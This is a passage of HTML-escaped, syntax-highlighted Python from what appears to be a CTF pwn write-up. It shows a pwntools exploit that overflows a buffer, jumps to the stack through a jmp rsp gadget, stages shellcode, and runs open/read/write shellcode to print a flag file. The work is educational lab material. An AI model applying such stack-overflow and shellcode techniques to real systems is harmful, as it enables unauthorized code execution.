lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# gdb.attach(io)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mnap = &lt;span class=&#34;number&#34;&gt;0x123000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    jmp_rsp = &lt;span class=&#34;number&#34;&gt;0x0400a01&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Easy shellcode, have fun!\n&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    shellcode = asm(shellcraft.read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,mnap,&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    shellcode += asm(&lt;span class=&#34;string&#34;&gt;&amp;#x27;mov rax,0x123000;call rax&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payload = shellcode.ljust(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;)+p64(jmp_rsp)+asm(&lt;span class=&#34;string&#34;&gt;&amp;quot;sub rsp,0x30;jmp rsp&amp;quot;&lt;/span&gt;)		&lt;span class=&#34;comment&#34;&gt;#这里的减0x30我没怎么看懂，记录在这儿&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payload2 = asm(shellcraft.&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./flag&amp;#x27;&lt;/span&gt;)+shellcraft.read(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,mnap+&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;)+shellcraft.write(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,mnap+&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&g